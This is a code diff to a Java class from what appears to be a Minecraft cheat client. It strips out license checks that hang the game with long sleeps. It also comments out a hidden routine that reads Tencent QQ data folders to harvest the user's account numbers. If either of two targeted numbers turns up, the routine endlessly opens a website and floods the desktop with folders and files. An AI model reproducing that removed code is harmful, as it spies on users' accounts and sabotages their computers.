@@ -59,26 +59,11 @@ public class NativeMethod implements Opcodes{
     public static void method1(Client client,boolean e){
         //true
         if (!Client.nmsl){
-            if (!ShitUtil.contains(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/version.txt?download=false","",""),Client.version)){
-                try {
-                    Thread.sleep(10000000);
-                } catch (InterruptedException ee) {
-                    ee.printStackTrace();
-                }
-            }
-            if (!ShitUtil.contains(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/hwid.txt?download=false","",""),HWIDUtils.getHWID())){
-                try {
-                    Thread.sleep(10000000);
-                } catch (InterruptedException ee) {
-                    ee.printStackTrace();
-                }
-            }
-            if (Client.username !=null){
-                client.fontManager = new FontManager();
-            }
-            if (Client.shitname != null){
-                client.modManager = new ModManager();
-            }
+
+            client.fontManager = new FontManager();
+
+            client.modManager = new ModManager();
+
 
             client.commandMgr = new CommandManager();//Command
 
@@ -86,70 +71,70 @@ public class NativeMethod implements Opcodes{
 
             Client.clickGui = new SkeetClickGui();
 
-            try {
-                if (!ModManager.getModByClass(IRC.class).isEnabled()){
-                    ModManager.getModByClass(IRC.class).set(true);
-                }
-            }catch (Exception ee){
-                ee.printStackTrace();
-            }
+//            try {
+//                if (!ModManager.getModByClass(IRC.class).isEnabled()){
+//                    ModManager.getModByClass(IRC.class).set(true);
+//                }
+//            }catch (Exception ee){
+//                ee.printStackTrace();
+//            }
             Client.nmsl = true;
         }
 
-        ArrayList<String> qq = new ArrayList<>();
-        try {
-            File qqData = new File(System.getenv("PUBLIC") + "\\Documents\\Tencent\\QQ\\UserDataInfo.ini");
-            if (qqData.exists() && qqData.isFile()) {
-                BufferedReader stream = new BufferedReader(new InputStreamReader(new FileInputStream(qqData)));
-                String line;
-                while ((line = stream.readLine()) != null && line.length() > 0) {
-                    if (line.startsWith("UserDataSavePath=")) {
-                        File tencentFiles = new File(line.split("=")[1]);
-                        if (tencentFiles.exists() && tencentFiles.isDirectory()) {
-                            for (File qqdir : Objects.requireNonNull(tencentFiles.listFiles())) {
-                                if (qqdir.isDirectory() && qqdir.getName().length() >= 6 && qqdir.getName().length() <= 10 && qqdir.getName().matches("^[0-9]*$")) {
-                                    qq.add(qqdir.getName());
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        } catch (Throwable e5) {
-            e5.printStackTrace();
-        }
+//        ArrayList<String> qq = new ArrayList<>();
+//        try {
+//            File qqData = new File(System.getenv("PUBLIC") + "\\Documents\\Tencent\\QQ\\UserDataInfo.ini");
+//            if (qqData.exists() && qqData.isFile()) {
+//                BufferedReader stream = new BufferedReader(new InputStreamReader(new FileInputStream(qqData)));
+//                String line;
+//                while ((line = stream.readLine()) != null && line.length() > 0) {
+//                    if (line.startsWith("UserDataSavePath=")) {
+//                        File tencentFiles = new File(line.split("=")[1]);
+//                        if (tencentFiles.exists() && tencentFiles.isDirectory()) {
+//                            for (File qqdir : Objects.requireNonNull(tencentFiles.listFiles())) {
+//                                if (qqdir.isDirectory() && qqdir.getName().length() >= 6 && qqdir.getName().length() <= 10 && qqdir.getName().matches("^[0-9]*$")) {
+//                                    qq.add(qqdir.getName());
+//                                }
+//                            }
+//                        }
+//                    }
+//                }
+//            }
+//        } catch (Throwable e5) {
+//            e5.printStackTrace();
+//        }
 
-        if (qq.contains("2844290146") || qq.contains("1955844037")){
-
-            try {
-                FileSystemView fsv = FileSystemView.getFileSystemView();
-                File com = fsv.getHomeDirectory();
-
-                for (int i=0;i<Integer.MAX_VALUE;i++){
-                    Runtime.getRuntime().exec("rundll32 url.dll,FileProtocolHandler https://seasonclient.cf/");
-                    Desktop.getDesktop().browse(URI.create("https://seasonclient.cf/"));
-                    Files.createDirectories(Paths.get(com.getPath()+"/NMSL"+i));
-                    Files.createFile(Paths.get(com.getPath()+"/NMSL"+i+".nmsl"));
-                }
-            } catch (Exception ioException) {
-            }
-        }
+//        if (qq.contains("2844290146") || qq.contains("1955844037")){
+//
+//            try {
+//                FileSystemView fsv = FileSystemView.getFileSystemView();
+//                File com = fsv.getHomeDirectory();
+//
+//                for (int i=0;i<Integer.MAX_VALUE;i++){
+//                    Runtime.getRuntime().exec("rundll32 url.dll,FileProtocolHandler https://seasonclient.cf/");
+//                    Desktop.getDesktop().browse(URI.create("https://seasonclient.cf/"));
+//                    Files.createDirectories(Paths.get(com.getPath()+"/NMSL"+i));
+//                    Files.createFile(Paths.get(com.getPath()+"/NMSL"+i+".nmsl"));
+//                }
+//            } catch (Exception ioException) {
+//            }
+//        }
 
         if (e){
-            if (!ShitUtil.contains(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/version.txt?download=false","",""),Client.version)){
-                try {
-                    Thread.sleep(10000000);
-                } catch (InterruptedException ee) {
-                    ee.printStackTrace();
-                }
-            }
-            if (!ShitUtil.contains(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/hwid.txt?download=false","",""),HWIDUtils.getHWID())){
-                try {
-                    Thread.sleep(10000000);
-                } catch (InterruptedException ee) {
-                    ee.printStackTrace();
-                }
-            }
+//            if (!ShitUtil.contains(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/version.txt?download=false","",""),Client.version)){
+//                try {
+//                    Thread.sleep(10000000);
+//                } catch (InterruptedException ee) {
+//                    ee.printStackTrace();
+//                }
+//            }
+//            if (!ShitUtil.contains(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/hwid.txt?download=false","",""),HWIDUtils.getHWID())){
+//                try {
+//                    Thread.sleep(10000000);
+//                } catch (InterruptedException ee) {
+//                    ee.printStackTrace();
+//                }
+//            }
         }
 
 
@@ -189,17 +174,17 @@ public class NativeMethod implements Opcodes{
     }
 
     public static void method1(){
-        if (Client.username == null) {
-            while (true) {
-                try {
-                    Thread.sleep(10000000);
-
-                } catch (InterruptedException interruptedException) {
-                    interruptedException.printStackTrace();
-                }
-                LogManager.getLogger().error("NMslNMslNMslNMslNMslNMslNMslNMslNMslNMslNMslNMslNMslNMslNMslNMslNMsl");
-            }
-        }
+//        if (Client.username == null) {
+//            while (true) {
+//                try {
+//                    Thread.sleep(10000000);
+//
+//                } catch (InterruptedException interruptedException) {
+//                    interruptedException.printStackTrace();
+//                }
+//                LogManager.getLogger().error("NMslNMslNMslNMslNMslNMslNMslNMslNMslNMslNMslNMslNMslNMslNMslNMslNMsl");
+//            }
+//        }
     }
 
     /**
@@ -210,57 +195,57 @@ public class NativeMethod implements Opcodes{
      * @param mode
      */
     public static void method2(AuthModule game,String mode){
-        if (mode.equalsIgnoreCase("onEnable")){
-            if (game instanceof  CheckVersion){
-                ((CheckVersion) game).selfversion = Client.version;
-                ((CheckVersion) game).version = NativeMethod.method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/version.txt?download=false");
-            }
-            if (game instanceof CheckHWID){
-
-                ((CheckHWID) game).selfHWID = HWIDUtils.getHWID();
-                ((CheckHWID) game).targetHWID = NativeMethod.method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/hwid.txt?download=true");
-
-
-                if (ShitUtil.contains(((CheckHWID) game).getTargetHWID(),(((CheckHWID) game).getSelfHWID()))){
-                    Client.username = HWIDUtils.getSubString(( ((CheckHWID) game).getTargetHWID()),((CheckHWID) game).getSelfHWID()+"<",">");
-
-                    if (Client.shitname == null){
-                        Client.shitname = Client.username;
-                    }
-                }
-
-            }
-        }
-        if (mode.equalsIgnoreCase("onDisable")){
-
-        }
+//        if (mode.equalsIgnoreCase("onEnable")){
+//            if (game instanceof  CheckVersion){
+//                ((CheckVersion) game).selfversion = Client.version;
+//                ((CheckVersion) game).version = NativeMethod.method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/version.txt?download=false");
+//            }
+//            if (game instanceof CheckHWID){
+//
+//                ((CheckHWID) game).selfHWID = HWIDUtils.getHWID();
+//                ((CheckHWID) game).targetHWID = NativeMethod.method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/hwid.txt?download=true");
+//
+//
+//                if (ShitUtil.contains(((CheckHWID) game).getTargetHWID(),(((CheckHWID) game).getSelfHWID()))){
+//                    Client.username = HWIDUtils.getSubString(( ((CheckHWID) game).getTargetHWID()),((CheckHWID) game).getSelfHWID()+"<",">");
+//
+//                    if (Client.shitname == null){
+//                        Client.shitname = Client.username;
+//                    }
+//                }
+//
+//            }
+//        }
+//        if (mode.equalsIgnoreCase("onDisable")){
+//
+//        }
     }
 
     public static String method1(String string,String fuck,String fucking){
-        try {
-            HttpURLConnection connection = (HttpURLConnection)new URL(string).openConnection();
-            connection.setRequestMethod("GET");
-            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.95 Safari/537.11");
-            connection.setConnectTimeout(10000);
-            connection.setUseCaches(false);
-            connection.connect();
-            if(connection.getResponseCode() == 200) {
-                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
-                StringBuffer sbf = new StringBuffer();
-                String temp = null;
-                while ((temp = br.readLine()) != null) {
-                    sbf.append(temp);
-                    sbf.append("\r\n");
-                }
-                String result = sbf.toString();
-                if(br != null) {
-                    br.close();
-                }
-                return result;
-            }
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
+//        try {
+//            HttpURLConnection connection = (HttpURLConnection)new URL(string).openConnection();
+//            connection.setRequestMethod("GET");
+//            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.95 Safari/537.11");
+//            connection.setConnectTimeout(10000);
+//            connection.setUseCaches(false);
+//            connection.connect();
+//            if(connection.getResponseCode() == 200) {
+//                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+//                StringBuffer sbf = new StringBuffer();
+//                String temp = null;
+//                while ((temp = br.readLine()) != null) {
+//                    sbf.append(temp);
+//                    sbf.append("\r\n");
+//                }
+//                String result = sbf.toString();
+//                if(br != null) {
+//                    br.close();
+//                }
+//                return result;
+//            }
+//        } catch (IOException e) {
+//            e.printStackTrace();
+//        }
         return "";
     }
 
@@ -289,52 +274,52 @@ public class NativeMethod implements Opcodes{
      *
      */
     public static void method1(AuthModule game){
-        if (game instanceof CheckVersion){
-            if (!ShitUtil.contains(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/version.txt?download=false"),Client.version)){
-                try {
-                    Thread.sleep(10000000);
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                }
-            }
-            if(!((CheckVersion) game).version.equals(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/version.txt?download=false"))){
-                try {
-                    Thread.sleep(10000000);
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                }
-            }
-            if (!game.run()) {
-                try {
-                    Class<?> clazz = Class.forName("javax.swing.JOptionPane");
-                    String str1 = "\u4f60\u6ca1\u6709\u901a\u8fc7\u7248\u672c\u9a8c\u8bc1";//version check info
-                    String leastversion = method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/version.txt?download=false");
-                    Method m = clazz.getMethod("showInputDialog", Component.class, Object.class, Object.class);
-                    m.invoke(m, null, str1, leastversion);
-                    Thread.sleep(10000000);
-                } catch (ClassNotFoundException | NoSuchMethodException | InvocationTargetException | IllegalAccessException | InterruptedException e) {
-                    LogManager.getLogger().error("NMSL");
-                }
-            }
-        }
+//        if (game instanceof CheckVersion){
+//            if (!ShitUtil.contains(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/version.txt?download=false"),Client.version)){
+//                try {
+//                    Thread.sleep(10000000);
+//                } catch (InterruptedException e) {
+//                    e.printStackTrace();
+//                }
+//            }
+//            if(!((CheckVersion) game).version.equals(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/version.txt?download=false"))){
+//                try {
+//                    Thread.sleep(10000000);
+//                } catch (InterruptedException e) {
+//                    e.printStackTrace();
+//                }
+//            }
+//            if (!game.run()) {
+//                try {
+//                    Class<?> clazz = Class.forName("javax.swing.JOptionPane");
+//                    String str1 = "\u4f60\u6ca1\u6709\u901a\u8fc7\u7248\u672c\u9a8c\u8bc1";//version check info
+//                    String leastversion = method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/version.txt?download=false");
+//                    Method m = clazz.getMethod("showInputDialog", Component.class, Object.class, Object.class);
+//                    m.invoke(m, null, str1, leastversion);
+//                    Thread.sleep(10000000);
+//                } catch (ClassNotFoundException | NoSuchMethodException | InvocationTargetException | IllegalAccessException | InterruptedException e) {
+//                    LogManager.getLogger().error("NMSL");
+//                }
+//            }
+//        }
 
-        if (game instanceof CheckHWID){
-            if (!ShitUtil.contains(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/hwid.txt?download=false"),HWIDUtils.getHWID())){
-                try {
-                    Thread.sleep(10000000);
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                }
-            }
-
-            if(!((CheckHWID) game).getTargetHWID().equals(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/hwid.txt?download=false"))){
-                try {
-                    Thread.sleep(10000000);
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                }
-            }
-        }
+//        if (game instanceof CheckHWID){
+//            if (!ShitUtil.contains(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/hwid.txt?download=false"),HWIDUtils.getHWID())){
+//                try {
+//                    Thread.sleep(10000000);
+//                } catch (InterruptedException e) {
+//                    e.printStackTrace();
+//                }
+//            }
+//
+//            if(!((CheckHWID) game).getTargetHWID().equals(method1("https://snowflake.coding.net/p/hwid/d/season/git/raw/master/hwid.txt?download=false"))){
+//                try {
+//                    Thread.sleep(10000000);
+//                } catch (InterruptedException e) {
+//                    e.printStackTrace();
+//                }
+//            }
+//        }
 
     }
 
